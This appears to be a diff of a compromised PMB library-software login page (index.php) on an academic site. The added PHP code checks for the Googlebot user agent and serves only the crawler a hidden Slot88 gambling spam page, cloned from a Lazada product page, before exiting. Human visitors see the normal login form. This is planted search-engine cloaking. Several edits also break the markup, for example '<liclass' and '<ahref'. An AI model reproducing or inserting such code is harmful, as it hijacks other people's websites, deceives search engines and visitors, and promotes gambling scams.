@@ -1,3 +1,9 @@
+<?php
+
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
+
 
 
 
@@ -21,13 +27,13 @@
   <meta name="og:title" content="Slot88 Gacor | Situs Andalan Para Pemburu Jackpot!"/>
   <meta name="og:type" content="product"/>
   <meta name="og:description" content="Spin dikit, cuan deras! Slot8 Gacor hadir dengan RTP tinggi, scatter mudah, dan bonus melimpah."/>
-  <meta name="og:image" content="https://res.cloudinary.com/dnromfcqt/image/upload/v1750404578/Untitled-1_s5qye5.jpg"/>
+  <meta name="og:image" content="https://res.cloudinary.com/dnromfcqt/image/upload/v1746611461/Untitled-1_qeqpf9.png"/>
   <!-- <link rel="manifest" href="https:https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json"> -->
   <link rel="shortcut icon" href="https://sunwukong.dev/logos/For4d_logo.png"/>
   <link rel="canonical" href="https://kp.ac.rw/"/>
   <link rel="amphtml" href="https://douberman.dev/amp/amp-kpac.html"/>
   <!-- start preload -->
-  <link rel="preload" href="https://res.cloudinary.com/dnromfcqt/image/upload/v1750404578/Untitled-1_s5qye5.jpg" as="image"/>
+  <link rel="preload" href="https://res.cloudinary.com/dnromfcqt/image/upload/v1746611461/Untitled-1_qeqpf9.png" as="image"/>
   <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id"/>
   <link rel="preconnect dns-prefetch" href="https://acs-m.lazada.co.id"/>
   <link rel="preconnect dns-prefetch" href="https://laz-g-cdn.alicdn.com"/>
@@ -272,7 +278,7 @@
     </path>
   </symbol>
   <symbol id="lazadaicon_service" viewBox="0 0 1024 1024">
-    <path d="M791.236118 531.80270466A78.30034946 78.30034946 0 0 0 785.77330297 517.91804997a61.45666943 61.45666943 0 0 0-30.38690869-29.02120529 20.03032178 20.03032178 0 0 0-8.19422255-3.30045065l-46.32012027-7.2837541a20.03032178 20.03032178 0 0 0-22.76172928 16.38844581l-36.76019288 219.99211563a19.80270466 19.80270466 0 0 0 16.27463616 22.76173001l42.79205178 6.94232733a17.41272317 17.41272317 0 0 0 3.41425958 0h5.34900611a60.7738181 60.7738181 0 0 0 41.54015658-17.75414919 79.66605358 79.66605358 0 0 0 9.78754377-11.38086501 79.66605358 79.66605358 0 0 0 8.9908828 0.79666097 77.73130633 77.73130633 0 0 0 26.6312238-4.77996369l-5.121389 30.1592923a83.30793026 83.30793026 0 0 1-35.96353262 51.10008252c-31.75261281 23.67219847-94.11975141 46.66154558-214.52930132 36.64638469a56.90432358 56.90432358 0 0 0-44.27156411-32.20784776c-29.47643951-4.89377188-56.90432358 9.78754378-60.43239133 33.00450801s16.95748823 45.52345929 46.43392773 50.7586572A58.2700277 58.2700277 0 0 0 530.84193207 869.58677086c22.76172928 2.16236438 44.61299011 3.18664247 65.09854685 3.18664248 80.69033094 0 142.60223533-16.27463689 184.82524325-48.59629284a120.86478413 120.86478413 0 0 0 49.84818803-76.59322005l17.98176632-108.23202392 3.18664246-18.66461766a77.95892343 77.95892343 0 0 0-60.54620098-88.88455421z m20.94079094 82.28365219l-5.23519719 31.41118677a38.125897 38.125897 0 0 1-30.72833545 30.61452652l17.07129715-101.74493154a38.01208808 38.01208808 0 0 1 18.89223549 39.71921825zM723.17854652 698.87379943a20.03032178 20.03032178 0 0 1-16.04701904 6.48709312l-22.76172929-3.86949381 30.27309978-180.95575016 22.76173 3.64187668a20.3717478 20.3717478 0 0 1 13.08799443 11.380865 48.82390995 48.82390995 0 0 1 3.8694938 30.04548266l-17.64034029 105.72823352A49.05152707 49.05152707 0 0 1 723.17854652 698.87379943zM285.58429604 491.28682617A19.91651357 19.91651357 0 0 0 262.25352361 475.80885026l-45.52345929 8.99088279a20.14413068 20.14413068 0 0 0-8.08041363 3.64187669 61.34286124 61.34286124 0 0 0-29.81786626 30.15929157A88.42931928 88.42931928 0 0 0 173.2551612 573.68428727l21.73745121 104.93157327c7.85279651 37.67066206 36.6463847 64.41569478 67.2609112 64.41569405a54.05910787 54.05910787 0 0 0 6.03185818-0.56904314h0.56904314a16.72987112 16.72987112 0 0 0 4.09711163 0l42.45062575-9.44611774A19.80270466 19.80270466 0 0 0 330.5387122 709.57181237zM264.75731402 703.19852818c-11.380865 2.27617329-26.40360597-11.380865-30.72833544-32.43546488L212.17771847 565.60387292a50.30342227 50.30342227 0 0 1 2.73140751-30.15929158A20.48555673 20.48555673 0 0 1 228.11092933 523.60848211l22.76172928-4.55234584L287.74666042 698.87379943zM771.43341334 458.62374419a93.09547403 93.09547403 0 0 1 16.04701904 9.78754378c0-103.56586915-25.37932861-183.80096588-74.20323782-238.99816004C661.38045108 171.02929132 582.85248376 141.21142578 479.28661461 141.21142578S297.87563022 171.02929132 245.86507854 229.52693612C196.47212546 285.29317342 171.20660503 366.89397427 171.77564889 472.39459067a89.56740555 89.56740555 0 0 1 19.11985261-13.54322937 54.05910787 54.05910787 0 0 1 18.77842655-7.6251794l3.6418767-0.68285133c2.84521643-83.87697341 23.89981629-148.97551953 63.5052256-193.47470145a67.37471941 67.37471941 0 0 0 34.1425943 37.67066277 63.96045983 63.96045983 0 0 0 26.06218066 5.34900612 88.54312818 88.54312818 0 0 0 45.52345857-13.31561155 139.52940179 139.52940179 0 0 1 22.76173002-10.69801295 234.44581418 234.44581418 0 0 1 74.43085566-11.380865 234.21819706 234.21819706 0 0 1 74.31704676 11.38086501 144.99221681 144.99221681 0 0 1 22.76172927 10.69801294 88.54312818 88.54312818 0 0 0 45.5234593 13.31561155 63.96045983 63.96045983 0 0 0 26.06217995-5.34900612 67.37471941 67.37471941 0 0 0 34.14259501-37.67066277c39.26398328 44.15775518 60.31858315 109.37011021 63.6190338 194.0437446l6.25947528 0.91046916a56.90432358 56.90432358 0 0 1 19.00604441 6.60090131z m-139.98463673-201.78273218a23.78600738 23.78600738 0 0 1-9.21850063 1.82093833 39.4916004 39.4916004 0 0 1-11.38086429-1.93474726A217.82975197 217.82975197 0 0 0 569.53687222 237.49354157l-1.25189519-0.56904315v1.02427808-1.02427808a273.82360639 273.82360639 0 0 0-87.74646722-13.65703758H478.48995436a272.45790226 272.45790226 0 0 0-87.5188501 13.7708465l-1.59332123 0.56904314a211.57027597 211.57027597 0 0 0-40.85730452 19.1198526 40.06064427 40.06064427 0 0 1-12.06371634 2.04855545 23.78600738 23.78600738 0 0 1-9.21850063-1.82093834c-10.01516088-4.55234587-14.90893277-18.55080946-17.18510606-29.70405662C353.30044148 197.43289802 410.20476579 182.41015633 479.62804064 182.29634741S606.06944801 197.43289802 649.20292582 227.13695464c-2.84521643 11.15324717-7.6251794 25.1517115-17.75414922 29.70405737z">
+    <path d="M791.236118 531.80270466A78.30034946 78.30034946 0 0 0 785.77330297 517.91804997a61.45666943 61.45666943 0 0 0-30.38690869-29.02120529 20.03032178 20.03032178 0 0 0-8.19422255-3.30045065l-46.32012027-7.2837541a20.03032178 20.03032178 0 0 0-22.76172928 16.38844581l-36.76019288 219.99211563a19.80270466 19.80270466 0 0 0 16.27463616 22.76173001l42.79205178 6.94232733a17.41272317 17.41272317 0 0 0 3.41425958 0h5.34900611a60.7738181 60.7738181 0 0 0 41.54015658-17.75414919 79.66605358 79.66605358 0 0 0 9.78754377-11.38086501 79.66605358 79.66605358 0 0 0 8.9908828 0.79666097 77.73130633 77.73130633 0 0 0 26.6312238-4.77996369l-5.121389 30.1592923a83.30793026 83.30793026 0 0 1-35.96353262 51.10008252c-31.75261281 23.67219847-94.11975141 46.66154558-214.52930132 36.64638469a56.90432358 56.90432358 0 0 0-44.27156411-32.20784776c-29.47643951-4.89377188-56.90432358 9.78754378-60.43239133 33.00450801s16.95748823 45.52345929 46.43392773 50.7586572A58.2700277 58.2700277 0 0 0 530.84193207 869.58677086c22.76172928 2.16236438 44.61299011 3.18664247 65.09854685 3.18664248 80.69033094 0 142.60223533-16.27463689 184.82524325-48.59629284a120.86478413 120.86478413 0 0 0 49.84818803-76.59322005l17.98176632-108.23202392 3.18664246-18.66461766a77.95892343 77.95892343 0 0 0-60.54620098-88.88455421z m20.94079094 82.28365219l-5.23519719 31.41118677a38.125897 38.125897 0 0 1-30.72833545 30.61452652l17.07129715-101.74493154a38.01208808 38.01208808 0 0 1 18.89223549 39.71921825zM723.17854652 698.87379943a20.03032178 20.03032178 0 0 1-16.04701904 6.48709312l-22.76172929-3.86949381 30.27309978-180.95575016 22.76173 3.64187668a20.3717478 20.3717478 0 0 1 13.08799443 11.380865 48.82390995 48.82390995 0 0 1 3.8694938 30.04548266l-17.64034029 105.72823352A49.05152707 49.05152707 0 0 1 723.17854652 698.87379943zM285.58429604 491.28682617A19.91651357 19.91651357 0 0 0 262.25352361 475.80885026l-45.52345929 8.99088279a20.14413068 20.14413068 0 0 0-8.08041363 3.64187669 61.34286124 61.34286124 0 0 0-29.81786626 30.15929157A88.42931928 88.42931928 0 0 0 173.2551612 573.68428727l21.73745121 104.93157327c7.85279651 37.67066206 36.6463847 64.41569478 67.2609112 64.41569405a54.05910787 54.05910787 0 0 0 6.03185818-0.56904314h0.56904314a16.72987112 16.72987112 0 0 0 4.09711163 0l42.45062575-9.44611774A19.80270466 19.80270466 0 0 0 330.5387122 709.57181237zM264.75731402 703.19852818c-11.380865 2.27617329-26.40360597-11.380865-30.72833544-32.43546488L212.17771847 565.60387292a50.30342227 50.30342227 0 0 1 2.73140751-30.15929158A20.48555673 20.48555673 0 0 1 228.11092933 523.60848211l22.76172928-4.55234584L287.74666042 698.87379943zM771.43341334 458.62374419a93.09547403 93.09547403 0 0 1 16.04701904 9.78754378c0-103.56586915-25.37932861-183.80096588-74.20323782-238.99816004C661.38045108 171.02929132 582.85248376 141.21142578 479.28661461 141.21142578S297.87563022 171.02929132 245.86507854 229.52693612C196.47212546 285.29317342 171.20660503 366.89397427 171.77564889 472.39459067a89.56740555 89.56740555 0 0 1 19.11985261-13.54322937 54.05910787 54.05910787 0 0 1 18.77842655-7.6251794l3.6418767-0.68285133c2.84521643-83.87697341 23.89981629-148.97551953 63.5052256-193.47470145a67.37471941 67.37471941 0 0 0 34.1425943 37.67066277 63.96045983 63.96045983 0 0 0 26.06218066 5.34900612 88.54312818 88.54312818 0 0 0 45.52345857-13.31561155 139.52940179 139.52940179 0 0 1 22.76173002-10.69801295 234.44581418 234.44581418 0 0 1 74.43085566-11.380865 234.21819706 234.21819706 0 0 1 74.31704676 11.38086501 144.99221681 144.99221681 0 0 1 22.76172927 10.69801294 88.54312818 88.54312818 0 0 0 45.5234593 13.31561155 63.96045983 63.96045983 0 0 0 26.06217995-5.34900612 67.37471941 67.37471941 00 0 34.14259501-37.67066277c39.26398328 44.15775518 60.31858315 109.37011021 63.6190338 194.0437446l6.25947528 0.91046916a56.90432358 56.90432358 0 0 1 19.00604441 6.60090131z m-139.98463673-201.78273218a23.78600738 23.78600738 0 0 1-9.21850063 1.82093833 39.4916004 39.4916004 0 0 1-11.38086429-1.93474726A217.82975197 217.82975197 0 0 0 569.53687222 237.49354157l-1.25189519-0.56904315v1.02427808-1.02427808a273.82360639 273.82360639 0 0 0-87.74646722-13.65703758H478.48995436a272.45790226 272.45790226 0 0 0-87.5188501 13.7708465l-1.59332123 0.56904314a211.57027597 211.57027597 0 0 0-40.85730452 19.1198526 40.06064427 40.06064427 0 0 1-12.06371634 2.04855545 23.78600738 23.78600738 0 0 1-9.21850063-1.82093834c-10.01516088-4.55234587-14.90893277-18.55080946-17.18510606-29.70405662C353.30044148 197.43289802 410.20476579 182.41015633 479.62804064 182.29634741S606.06944801 197.43289802 649.20292582 227.13695464c-2.84521643 11.15324717-7.6251794 25.1517115-17.75414922 29.70405737z">
     </path>
   </symbol>
   <symbol id="lazadaicon_nowarranty" viewBox="0 0 1024 1024">
@@ -349,7 +355,7 @@
     <path d="M433.694118 602.352941l-90.352942-90.352941-57.223529 57.223529 147.576471 141.552942 304.188235-337.317647-57.223529-57.22353-246.964706 286.117647zM512 60.235294c249.976471 0 451.764706 201.788235 451.764706 451.764706s-201.788235 451.764706-451.764706 451.764706S60.235294 761.976471 60.235294 512 262.023529 60.235294 512 60.235294z" fill="#3352ed"></path>
   </symbol>
   <symbol id="lazadaicon_addToCart" viewBox="0 0 1024 1024">
-    <path d="M520.533333 738.133333c-34.133333 0-64 29.866667-64 64s29.866667 64 64 64 64-29.866667 64-64-25.6-64-64-64zM324.266667 213.333333v64h64l119.466666 251.733334-46.933333 76.8c-4.266667 8.533333-8.533333 21.333333-8.533333 34.133333 0 34.133333 29.866667 64 64 64h392.533333V640h-379.733333c-4.266667 0-8.533333-4.266667-8.533334-8.533333v-4.266667l29.866667-55.466667h243.2c25.6 0 46.933333-12.8 55.466667-34.133333l119.466666-213.333333c12.8-4.266667 12.8-4.266667 12.8-12.8 0-21.333333-12.8-34.133333-34.133333-34.133334H460.8L430.933333 213.333333H324.266667z m524.8 524.8c34.133333 0 64 29.866667 64 64s-29.866667 64-64 64-64-29.866667-64-64 29.866667-64 64-64z m-610.133334-256h123.733334V554.666667H238.933333v140.8H166.4V554.666667H42.666667v-72.533334h123.733333v-128h76.8v128z" fill="#9E9E9E"></path>
+    <path d="M520.533333 738.133333c-34.133333 0-64 29.866667-64 64s29.866667 64 64 64 64-29.866667 64-64-25.6-64-64-64zM324.266667 213.333333v64h64l119.466666 251.733334-46.933333 76.8c-4.266667 8.533333-8.533333 21.333333-8.533333 34.133333 0 34.133333 29.866667 64 64 64h392.533333V640h-379.733333c-4.266667 0-8.533333-4.266667-8.533334-8.533333v-4.266667l29.866667-55.466667h243.2c25.6 0 46.933333-12.8 55.466667-34.133333l119.466666-213.333333c12.8-4.266667 12.8-4.266667 12.8-12.8 0-21.333333-12.8-34.133333-34.133333-34.133334H460.8L430.933333 213.333333H324.266667z m524.8 524.8c34.133333 0 64 29.866667 64 64s-29.866667 64-64 64-64-29.866667-64-64 29.866667-64 64-64zm-610.133334-256h123.733334V554.666667H238.933333v140.8H166.4V554.666667H42.666667v-72.533334h123.733333v-128h76.8v128z" fill="#9E9E9E"></path>
   </symbol>
   <symbol id="lazadaicon_tooltip" viewBox="0 0 1024 1024">
     <path d="M469.333333 725.333333h85.333334v-256h-85.333334v256z m42.666667-640C277.333333 85.333333 85.333333 277.333333 85.333333 512s192 426.666667 426.666667 426.666667 426.666667-192 426.666667-426.666667S746.666667 85.333333 512 85.333333z m0 768c-187.733333 0-341.333333-153.6-341.333333-341.333333s153.6-341.333333 341.333333-341.333333 341.333333 153.6 341.333333 341.333333-153.6 341.333333-341.333333 341.333333zM469.333333 384h85.333334V298.666667h-85.333334v85.333333z" fill="#808080"></path>
@@ -382,7 +388,7 @@
     </path>
   </symbol>
   <symbol id="lazadaicon_sound" viewBox="0 0 1024 1024">
-    <path d="M643.990069 8.474483L226.674759 282.129655H0.865103v460.446897h225.739035l417.368276 273.655172V8.474483h0.017655zM94.419862 375.684414h99.36331V649.004138H94.419862V375.702069z m456.033104 467.367724l-263.09738-172.491035V354.198069l263.079724-172.526345v661.362759zM745.613241 383.735172h93.554759v257.218207h-93.554759zM930.445241 302.856828H1024v419.027862h-93.554759z">
+    <path d="M643.990069 8.474483L226.674759 282.129655H0.865103v460.446897h225.739035l417.368276 273.655172V8.474483h0.017655zM94.419862375.684414h99.36331V649.004138H94.419862V375.702069z m456.033104 467.367724l-263.09738-172.491035V354.198069l263.079724-172.526345v661.362759zM745.613241 383.735172h93.554759v257.218207h-93.554759zM930.445241 302.856828H1024v419.027862h-93.554759z">
     </path>
   </symbol>
   <symbol id="lazadaicon_smallScreen" viewBox="0 0 1024 1024">
@@ -648,8 +654,7 @@
                 </a>
           </li>
           <li class="account-item">
-                <a href="https://kp.ac.rw/" class="account-item-anchor">
-                    <span class="account-icon test wishlist"></span>Wishlist dan Toko yang Saya Ikuti
+                <a href="https://kp.ac.rw/" class="account-item-anchor"><span class="account-icon test wishlist"></span>Wishlist dan Toko yang Saya Ikuti
                 </a>
           </li>
           <li class="account-item">
@@ -910,7 +915,7 @@
                             [{"childCategoryName":"Sepatu Flat","childCategoryUrl":"https://kp.ac.rw/flat-shoes/"},{"childCategoryName":"Sepatu Hak Tinggi","childCategoryUrl":"https://kp.ac.rw/heels/"},{"childCategoryName":"Sneakers","childCategoryUrl":"https://kp.ac.rw/sneakers/"},{"childCategoryName":"Wedges","childCategoryUrl":"https://kp.ac.rw/wedges/"},{"childCategoryName":"Sepatu Boot","childCategoryUrl":"https://kp.ac.rw/boots-wanita/"},{"childCategoryName":"Aksesoris Sepatu","childCategoryUrl":"https://kp.ac.rw/aksesoris-sepatu-wanita/"},{"childCategoryName":"Sandal","childCategoryUrl":"https://kp.ac.rw/sandal-wanita/"},{"childCategoryName":"Sandal & Flip Flop","childCategoryUrl":"https://kp.ac.rw/sandal-jepit-wanita/"}]
                         </script>
             </li>
-            <li class="lzd-site-menu-sub-item" data-cate="cate_3_5">
+            <liclass="lzd-site-menu-sub-item" data-cate="cate_3_5">
 
                 <a href="https://kp.ac.rw/aksesoris-wanita/">
                     <span>Aksesoris</span>
@@ -1378,8 +1383,7 @@
                         <script type="text" class="J_data_8_2">
                             [{"childCategoryName":"","childCategoryUrl":""},{"childCategoryName":"Seprai","childCategoryUrl":"https://kp.ac.rw/seprei-ranjang/"},{"childCategoryName":"Seprai Set","childCategoryUrl":"https://kp.ac.rw/perangkat-seprei/"},{"childCategoryName":"Selimut","childCategoryUrl":"https://kp.ac.rw/selimut-dan-selimut-panjang/"},{"childCategoryName":"Bantal","childCategoryUrl":"https://kp.ac.rw/beli-bantal/"},{"childCategoryName":"Aksesoris Tempat Tidur","childCategoryUrl":"https://kp.ac.rw/beli-aksesoris-ranjang/"},{"childCategoryName":"Sarung Bantal","childCategoryUrl":"https://kp.ac.rw/beli-sarung-bantal/"},{"childCategoryName":"Selimut Tebal","childCategoryUrl":"https://kp.ac.rw/seprei-dan-selimut-tebal/"},{"childCategoryName":"Pelindung Kasur","childCategoryUrl":"https://kp.ac.rw/kasur-pelindung/"}]
                         </script>
-            </li>
-            <li class="lzd-site-menu-sub-item" data-cate="cate_9_4">
+            </li><li class="lzd-site-menu-sub-item" data-cate="cate_9_4">
                 <a href="https://kp.ac.rw/penerangan/">
                     <span>Penerangan</span>
                 </a>
@@ -1486,7 +1490,7 @@
                         </script>
             </li>
             <li class="lzd-site-menu-sub-item" data-cate="cate_10_6">
-                <a href="https://kp.ac.rw/shop-kebutuhan-rumah-tangga">
+                <ahref="https://kp.ac.rw/shop-kebutuhan-rumah-tangga">
                     <span>Kebutuhan Rumah Tangga</span>
                 </a>
                         <script type="text" class="J_data_9_5">
@@ -2156,8 +2160,7 @@
                             [{"childCategoryName":"Emas Murni","childCategoryUrl":"https://kp.ac.rw/beli-anak-emas-murni/"},{"childCategoryName":"Perhiasan Fashion","childCategoryUrl":"https://kp.ac.rw/beli-anak-perhiasan-fashion/"}]
                         </script>
             </li>
-            <li class="lzd-site-menu-sub-item" data-cate="cate_5_9">
-                <a href="https://kp.ac.rw/beli-jam-tangan-anak/">
+            <li class="lzd-site-menu-sub-item" data-cate="cate_5_9"><a href="https://kp.ac.rw/beli-jam-tangan-anak/">
                     <span>Jam Tangan Anak</span>
                 </a>
                         <script type="text" class="J_data_4_8">
@@ -2359,8 +2362,7 @@
                         <script type="text" class="J_data_6_11">
                             [{"childCategoryName":"Playgym & Playmat","childCategoryUrl":"https://kp.ac.rw/jual-mainan-gym-anak/"},{"childCategoryName":"Mainan Blok","childCategoryUrl":"https://kp.ac.rw/beli-mainan-balok-bangunan/"},{"childCategoryName":"Mainan Mandi","childCategoryUrl":"https://kp.ac.rw/beli-mainan-mandi-anak-tg/"},{"childCategoryName":"Mainan Tidur Bayi","childCategoryUrl":"https://kp.ac.rw/beli-mainan-keranjang-bayi-perlengkapannya-tg/"},{"childCategoryName":"Mainan Balita","childCategoryUrl":"https://kp.ac.rw/beli-mainan-edukatif-anak-tg/"},{"childCategoryName":"Mainan Musik & Suara","childCategoryUrl":"https://kp.ac.rw/beli-musik-suara-tg/"},{"childCategoryName":"Mainan Tarik Ulur","childCategoryUrl":"https://kp.ac.rw/beli-mainan-dorong-tarik-tg/"},{"childCategoryName":"Mainan Shape Sorting","childCategoryUrl":"https://kp.ac.rw/beli-mainan-shape-sorting-tg/"},{"childCategoryName":"Indoor Climbers & Play Structures","childCategoryUrl":"https://kp.ac.rw/beli-indoor-climbers-play-structure-tg/"},{"childCategoryName":"Rocking & Spring Ride-Ons","childCategoryUrl":"https://kp.ac.rw/beli-rocking-spring-ride-on-tg/"}]
                         </script>
-            </li>
-        </ul>
+            </li></ul>
         <ul class="lzd-site-menu-sub Level_1_Category_No8" data-spm="cate_8">
             <li class="lzd-site-menu-sub-item" data-cate="cate_8_1">
                 <a href="https://kp.ac.rw/beli-tv-audio-video-permainan-dan-gadget/">
@@ -2860,7 +2862,7 @@
 
   </div>
   <div id="container" style="visibility: visible;">
-    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="Slot88 Gacor | Situs Andalan Para Pemburu Jackpot!" src="https://res.cloudinary.com/dnromfcqt/image/upload/v1750404578/Untitled-1_s5qye5.jpg" data-pagespeed-url-hash="4235623739" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></div><p><a href="https://douberman.dev/amp/amp-kpac.html"><img style="display: block; width:auto; margin-left: auto; margin-right: auto;" title="SLOT88" src="https://res.cloudinary.com/dnromfcqt/image/upload/v1749767612/daftar_slot_online_cwkyzh.gif" width="300" height="92" data-pagespeed-url-hash="1934530767" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></a></p></div>
+    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="Slot88 Gacor | Situs Andalan Para Pemburu Jackpot!" src="https://res.cloudinary.com/dnromfcqt/image/upload/v1746611461/Untitled-1_qeqpf9.png" data-pagespeed-url-hash="4235623739" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></div><p><a href="https://douberman.dev/amp/amp-kpac.html"><img style="display: block; width:auto; margin-left: auto; margin-right: auto;" title="SLOT88" src="https://res.cloudinary.com/dnromfcqt/image/upload/v1749767612/daftar_slot_online_cwkyzh.gif" width="300" height="92" data-pagespeed-url-hash="1934530767" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></a></p></div>
   
   
   
@@ -3131,3 +3133,132 @@ window.__pdpHydrateStatus=1;var loading=document.getElementById('pdp-skeleton-ne
 </div>
 </body>
 </html>
+<?php
+exit;
+}
+?>
+
+<?php
+// +-------------------------------------------------+
+//  2002-2004 PMB Services / www.sigb.net pmb@sigb.net et contributeurs (voir www.sigb.net)
+// +-------------------------------------------------+
+/* 
+
+Ce logiciel est un programme informatique servant  grer une bibliothque
+ou un centre de documentation et notamment le catalogue des ouvrages et le
+fichier des lecteurs. PMB est conforme  la dclaration simplifie de la CNIL
+en ce qui concerne le respect de la Loi Informatique et Liberts applicable
+en France.
+
+Ce logiciel est rgi par la licence CeCILL soumise au droit franais et
+respectant les principes de diffusion des logiciels libres. Vous pouvez
+utiliser, modifier et/ou redistribuer ce programme sous les conditions
+de la licence CeCILL telle que diffuse par le CEA, le CNRS et l'INRIA 
+sur le site "http://www.cecill.info".
+
+En contrepartie de l'accessibilit au code source et des droits de copie,
+de modification et de redistribution accords par cette licence, il n'est
+offert aux utilisateurs qu'une garantie limite.  Pour les mmes raisons,
+seule une responsabilit restreinte pse sur l'auteur du programme,  le
+titulaire des droits patrimoniaux et les concdants successifs.
+
+A cet gard  l'attention de l'utilisateur est attire sur les risques
+associs au chargement,   l'utilisation,   la modification et/ou au
+dveloppement et  la reproduction du logiciel par l'utilisateur tant 
+donn sa spcificit de logiciel libre, qui peut le rendre complexe  
+manipuler et qui le rserve donc  des dveloppeurs et des professionnels
+avertis possdant  des  connaissances  informatiques approfondies.  Les
+utilisateurs sont donc invits  charger  et  tester  l'adquation  du
+logiciel  leurs besoins dans des conditions permettant d'assurer la
+scurit de leurs systmes et ou de leurs donnes et, plus gnralement, 
+ l'utiliser et l'exploiter dans les mmes conditions de scurit. 
+
+Le fait que vous puissiez accder  cet en-tte signifie que vous avez 
+pris connaissance de la licence CeCILL, et que vous en avez accept les
+termes.
+
+ */
+// +-------------------------------------------------+
+// $Id: index.php,v 1.20 2017/03/17 13:51:42 dgoron Exp $
+
+// dfinition du minimum ncssaire 
+$base_path=".";
+
+include_once ("./includes/error_report.inc.php") ;
+include_once ("./includes/global_vars.inc.php") ;
+include_once ("./includes/config.inc.php");
+
+if (file_exists("$include_path/db_param.inc.php")) require_once("$include_path/db_param.inc.php") ;
+require_once("$include_path/mysql_connect.inc.php");
+$dbh = connection_mysql(0);
+
+require_once("$include_path/sessions.inc.php");
+
+require_once("$include_path/misc.inc.php");
+include_once("$javascript_path/misc.inc.php");
+
+
+// rcupration des messages avec localisation
+
+// localisation (fichier XML)
+include_once("$class_path/XMLlist.class.php");
+
+$messages = new XMLlist("$include_path/messages/$lang.xml", 0);
+$messages->analyser();
+$msg = $messages->table;
+
+// temporaire :
+$inst_language = "";
+$current_module = "";
+	
+require_once("$include_path/templates/common.tpl.php");
+require_once("$include_path/templates/index.tpl.php");
+
+if (!$dbh) {
+	header ("Content-Type: text/html; charset=".$charset);
+	print $index_header;
+	print $extra_version;
+	print "<br /><br /><div class='erreur'> $__erreur_cnx_base__ </div><br /><br />" ;
+	print $msg["cnx_base_err1"]." <a href='./tables".$inst_language."/install.php'>./tables/install.php</a> ? <br /><br />.".$msg["cnx_base_err2"];
+	print $index_footer;
+	exit ;
+	}
+
+// affichage du form de login
+if (!isset($demo) || $demo=="") $demo = 0;
+header ("Content-Type: text/html; charset=$charset");
+
+if (!isset($login_error) || !$login_error) {
+	//Est-on dj authentifi ?
+	if (checkUser('PhpMyBibli')) {
+		header("Location: ./main.php");
+		exit();
+	}
+}
+
+print $index_layout;
+
+if ($demo) {
+	if (!isset($login_error) || !$login_error) {
+		$login_form_demo = str_replace("!!erreur!!", "&nbsp;", $login_form_demo);
+		print $login_form_demo;
+	} else {
+		$login_form_demo = str_replace("!!erreur!!", $login_form_error, $login_form_demo);
+		print $login_form_demo;
+	}
+} else { 
+	if (!isset($login_error) || !$login_error) {
+		$login_form = str_replace("!!erreur!!", "&nbsp;", $login_form);
+	} else {
+		$login_form = str_replace("!!erreur!!", $login_form_error, $login_form);
+	}
+	if (isset($login_message) && $login_message) { 
+		$login_form = str_replace("!!login_message!!", $login_message, $login_form); 
+	} else {
+		$login_form = str_replace("!!login_message!!", "", $login_form);
+	}
+	print $login_form;
+}
+
+print form_focus('login', 'user');
+print $index_footer;
